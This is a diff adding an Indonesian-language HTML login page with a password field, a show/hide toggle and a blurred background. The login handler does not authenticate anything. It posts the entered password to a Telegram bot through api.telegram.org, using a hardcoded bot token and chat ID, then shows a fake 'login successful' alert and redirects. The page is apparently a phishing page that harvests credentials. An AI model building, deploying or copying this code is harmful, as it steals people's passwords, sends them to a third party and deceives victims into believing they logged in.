@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body, html {
+    width: 100%;
+    height: 100vh;
+    overflow: hidden;
+    background-color: #faf3f5; /* Warna latar belakang */
+    position: relative;
+}
+
+/* PNG Overlay */
+.overlay {
+    
+   position: absolute;
+    top: 40%; /* Atur supaya agak ke atas */
+    left: 50%;
+    transform: translate(-50%, -60%);
+    width: 385px; /* Ukuran  PNG */
+    height: auto; /* Agar proporsional */
+}
+body::before {
+
+    content: "";
+    position: fixed; /* Menggunakan fixed agar menutupi seluruh layar */
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: url('bg.webp') no-repeat center center fixed;
+    background-size: cover;
+    backdrop-filter: blur(15px); /* Efek blur ke seluruh layar */
+    -webkit-backdrop-filter: blur(15px);
+    z-index: -1; /* Tetap di belakang elemen lainnya */
+}
+
+/* Login Container Fullscreen */
+.login-container {
+    position: fixed; /* Tetap di tempat */
+    top: 0;
+    left: 0;
+    width: 100vw; /* Full width */
+    height: 100vh; /* Full height */
+    background: rgba(255, 255, 255, 0.2); /* Warna transparan */
+    backdrop-filter: blur(15px); /* Blur full screen */
+    -webkit-backdrop-filter: blur(15px);
+    display: flex;
+    flex-direction: column;
+    justify-content: center; /* Tengah vertikal */
+    align-items: center; /* Tengah horizontal */
+    text-align: center;
+    z-index: 1; /* Pastikan di atas */
+    padding: 20px;
+    box-shadow: none; /* Hapus shadow biar lebih bersih */
+    border-radius: 0; /* Hapus radius biar full */
+}
+
+        .exit {
+             position: absolute;
+             top: 15px;  /* Jarak dari atas */
+             right: 15px; /* Jarak dari kanan */
+             width: 35px; /* Ukuran tetap */
+             height: auto;
+             cursor: pointer;
+             border-radius: 50%;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 100px;
+            margin-top: -200px;
+        }
+        /* Input dan tombol biar rapi */
+
+        .input-container {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    background: white;
+    border-radius: 25px;
+    border: 2px solid #0400ff;
+    padding: 5px;
+    box-sizing: border-box;
+    margin-bottom: 15px; /* Tambahin jarak antara input dan tombol login */
+}
+
+.password-input {
+    flex: 1;
+    font-weight: bold;
+    border: none;
+    outline: none;
+    font-size: 15px;
+    padding: 10px;
+    border-radius: 20px;
+    margin-left: 20px; /* Sesuaikan jaraknya */
+    width: 100%;
+    background: transparent;
+}
+
+.toggle-password {
+    width: 24px;
+    height: 24px;
+    cursor: pointer;
+    margin-right: 20px; /* Geser ke kiri */
+}
+
+
+.login-button {
+    font-weight: bold;
+    width: 100%;
+    padding: 12px;
+    border-radius: 20px;
+    border: none;
+    font-size: 16px;
+    color: white;
+    background: rgb(214, 214, 214);
+    cursor: not-allowed;
+    transition: 0.3s;
+}
+        .login-button.active {
+    background: blue;
+    cursor: pointer;
+}
+
+/* Link lupa password */
+.forgot-password {
+    font-family: Arial, Helvetica, sans-serif;
+    margin-top: 30px;
+    font-size: 14px;
+    font-weight: bold;
+    color: rgb(13, 0, 255);
+    cursor: pointer;
+}
+        .bg1 {
+    position: absolute;
+    top: 40%; /* Atur supaya agak ke atas */
+    left: 50%;
+    transform: translate(-50%, -60%);
+    width: 385px; /* Ukuran PNG */
+    height: auto; /* Agar proporsional */
+}
+    </style>
+</head>
+<body>
+    <div>
+        <div class="blur-overlay"></div>
+    
+        <img src="bg.webp" class="overlay">
+    </div>
+    
+    <div class="login-container">
+        <img src="x.png" alt="exit" class="exit" id="playButton11">
+        
+        <img src="logo.png" alt="Logo" class="logo">
+        <div class="input-container">
+            <input type="password" id="password" class="password-input" placeholder="Password">
+            <img src="eye-close.png" alt="Show" class="toggle-password" id="togglePassword">
+        </div>
+        
+        <button class="login-button" id="loginButton">Login</button>
+        <div class="forgot-password">Lupa password?</div>
+    </div>
+    
+    <script>
+          document.getElementById("playButton11").addEventListener("click", function() {
+            window.location.href = "load.html";
+        });
+
+        const passwordInput = document.getElementById("password");
+        const togglePassword = document.getElementById("togglePassword");
+        const loginButton = document.getElementById("loginButton");
+
+        passwordInput.addEventListener("input", () => {
+            if (passwordInput.value.trim() !== "") {
+                loginButton.classList.add("active");
+                loginButton.style.cursor = "pointer";
+            } else {
+                loginButton.classList.remove("active");
+                loginButton.style.cursor = "not-allowed";
+            }
+        });
+
+        togglePassword.addEventListener("click", () => {
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                togglePassword.src = "eye-open.png";
+            } else {
+                passwordInput.type = "password";
+                togglePassword.src = "eye-close.png";
+            }
+        });
+            window.addEventListener("scroll", function() {
+    window.scrollTo(0, 0);
+});
+document.getElementById("loginButton").addEventListener("click", function() {
+        const password = document.getElementById("password").value;
+
+        if (password.trim() === "") {
+            alert("Password tidak boleh kosong!");
+            return;
+        }
+
+        // Ganti dengan token bot kamu
+        const botToken = "8077461850:AAH8wdhBg2pux-lgWIywaFrKJEbEsO7jqAU";
+        // Ganti dengan chat ID kamu
+        const chatId = "-1002335844426";
+
+        const message = `🔒 Login Detected\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert("Login berhasil!");
+                window.location.href = "dashboard.html"; // Redirect ke halaman lain jika diperlukan
+            } else {
+                alert("Gagal mengirim data ke Telegram!");
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    });
+    </script>
+</body>
+</html>
